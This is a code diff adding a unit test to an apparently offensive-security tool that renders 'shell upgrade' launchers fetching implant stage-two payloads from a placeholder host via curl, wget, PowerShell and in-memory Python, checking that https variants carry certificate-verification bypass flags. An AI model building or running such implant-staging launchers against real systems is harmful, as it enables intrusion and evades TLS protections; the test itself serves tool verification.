@@ -231,6 +231,32 @@ public class LauncherRenderTests
         Assert.All(rendered, l => Assert.Contains("secret", l.Command));
     }
 
+    [Fact]
+    public void Render_AnHttpsFrontCarriesEachFamilysVerificationBypass()
+    {
+        // The engagement CA terminates the front's TLS, and no stock
+        // target-side toolchain trusts it (the implant pins the CA it
+        // baked; curl and friends verify against system stores) -- so the
+        // https spellings must render runnable: each family carries its
+        // own no-verify flag, cleartext fronts none.
+        var https = ShellUpgradeLaunchers.Render(
+            "https://stage.example.test/implants/stage2/abc", "secret");
+        Assert.Contains(https, l => l.Id == "unix-curl" && l.Command.Contains("-kfsSL"));
+        Assert.Contains(https, l => l.Id == "unix-wget" && l.Command.Contains("--no-check-certificate"));
+        Assert.Contains(https, l => l.Id == "windows-powershell"
+            && l.Command.Contains("ServerCertificateValidationCallback"));
+        Assert.Contains(https, l => l.Id == "unix-python-memfd"
+            && l.Command.Contains("ssl._create_unverified_context()")
+            && l.Command.Contains("urlopen(q,context=c)"));
+
+        var http = ShellUpgradeLaunchers.Render(
+            "http://stage.example.test/implants/stage2/abc", "secret");
+        Assert.Contains(http, l => l.Id == "unix-curl" && l.Command.Contains("-fsSL")
+            && !l.Command.Contains("-k"));
+        Assert.Contains(http, l => l.Id == "unix-wget" && !l.Command.Contains("--no-check-certificate"));
+        Assert.Contains(http, l => l.Id == "unix-python-memfd" && !l.Command.Contains("unverified"));
+    }
+
     private sealed record LauncherRenderDto(
         string PayloadId,
         string Url,
